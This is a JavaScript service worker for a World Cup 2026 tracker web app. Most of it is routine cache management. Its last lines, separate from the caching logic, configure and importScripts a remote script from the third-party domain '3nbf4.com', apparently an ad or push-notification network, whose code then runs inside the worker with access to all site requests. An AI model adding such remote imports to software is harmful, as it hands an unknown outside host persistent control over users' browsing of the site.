/**
 * World Cup 2026 Tracker — Service Worker
 * ⚠️  IMPORTANT: Bump CACHE_VER on EVERY deploy
 *     e.g. 'wc2026-v6' → 'wc2026-v7' → 'wc2026-v8'
 *     This forces all users to get fresh files.
 */

var CACHE_VER = 'wc2026-v7';

var PRECACHE = [
  '/',
  '/index.html',
  '/style.css',
  '/app.js',
  '/manifest.json'
];

/* Install — pre-cache core assets */
self.addEventListener('install', function(e) {
  e.waitUntil(
    caches.open(CACHE_VER)
      .then(function(c) { return c.addAll(PRECACHE); })
      .then(function()  { return self.skipWaiting(); })
  );
});

/* Activate — delete old caches, claim clients immediately */
self.addEventListener('activate', function(e) {
  e.waitUntil(
    caches.keys()
      .then(function(keys) {
        return Promise.all(
          keys
            .filter(function(k) { return k !== CACHE_VER; })
            .map(function(k)    { return caches.delete(k); })
        );
      })
      .then(function() { return self.clients.claim(); })
  );
});

/* Fetch strategy:
   - Netlify functions  → always network (live API data)
   - HTML pages         → network first, cache fallback
   - Assets (CSS/JS)    → cache first, network fallback
*/
self.addEventListener('fetch', function(e) {
  var url = e.request.url;

  /* Skip non-GET, chrome-extensions, external CDNs */
  if (e.request.method !== 'GET')            return;
  if (url.indexOf('chrome-extension') !== -1) return;
  if (url.indexOf('fonts.google')     !== -1) return;
  if (url.indexOf('jsdelivr')         !== -1) return;
  if (url.indexOf('unpkg.com')        !== -1) return;
  if (url.indexOf('paystack')         !== -1) return;
  if (url.indexOf('googlesyndication') !== -1) return;

  /* API calls — network only */
  if (url.indexOf('/.netlify/') !== -1) return;

  /* HTML — network first */
  if (e.request.headers.get('accept') &&
      e.request.headers.get('accept').indexOf('text/html') !== -1) {
    e.respondWith(
      fetch(e.request)
        .then(function(res) {
          var clone = res.clone();
          caches.open(CACHE_VER).then(function(c) { c.put(e.request, clone); });
          return res;
        })
        .catch(function() { return caches.match(e.request); })
    );
    return;
  }

  /* Assets — cache first */
  e.respondWith(
    caches.match(e.request)
      .then(function(cached) {
        if (cached) return cached;
        return fetch(e.request)
          .then(function(res) {
            if (res && res.status === 200 && res.type === 'basic') {
              var clone = res.clone();
              caches.open(CACHE_VER).then(function(c) { c.put(e.request, clone); });
            }
            return res;
          });
      })
      .catch(function() { return caches.match('/index.html'); })
  );
});

self.options = {
    "domain": "3nbf4.com",
    "zoneId": 11135662
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
